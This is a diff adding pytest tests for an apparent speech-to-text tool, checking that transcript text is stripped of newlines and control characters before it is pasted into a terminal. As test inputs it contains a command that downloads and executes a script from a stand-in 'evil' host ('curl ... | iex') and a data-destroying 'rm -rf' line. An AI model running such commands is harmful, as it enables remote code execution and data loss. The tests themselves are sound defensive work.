@@ -101,6 +101,38 @@ def test_no_audio_files_written_by_pipeline(tmp_path, monkeypatch):
     assert "spoken" not in telemetry_text  # latency only, never content
 
 
+def test_injection_text_strips_control_chars_and_newlines():
+    """A network STT/cleanup response with embedded newlines must not become
+    multiple terminal command lines when pasted + Enter'd."""
+    from selfscribe.app import sanitize_for_injection
+
+    payload = "ok\ncurl -s http://evil/x.ps1 | iex\n"
+    cleaned = sanitize_for_injection(payload)
+    assert "\n" not in cleaned and "\r" not in cleaned
+    assert cleaned == "ok curl -s http://evil/x.ps1 | iex"
+    assert sanitize_for_injection("a\r\nb\tc\x07d") == "a b cd"
+    assert sanitize_for_injection("   spaced   out   ") == "spaced out"
+
+
+def test_process_clip_sanitizes_before_inject(monkeypatch):
+    import selfscribe.app as app_module
+
+    monkeypatch.setattr(
+        app_module,
+        "transcribe_clip",
+        lambda clip, cfg: Transcript(text="line one\nrm -rf important\n", ms=1.0, backend="groq"),
+    )
+    calls = []
+    app_module.process_clip(
+        Clip(pcm=np.ones(SAMPLE_RATE, dtype=np.int16)),
+        "send",
+        Config(groq_api_key="k"),
+        inject=lambda text, press_enter: calls.append((text, press_enter)),
+    )
+    assert calls == [("line one rm -rf important", True)]
+    assert "\n" not in calls[0][0]
+
+
 def test_clipboard_restore_is_default_behavior():
     from selfscribe.inject import inject_text
 
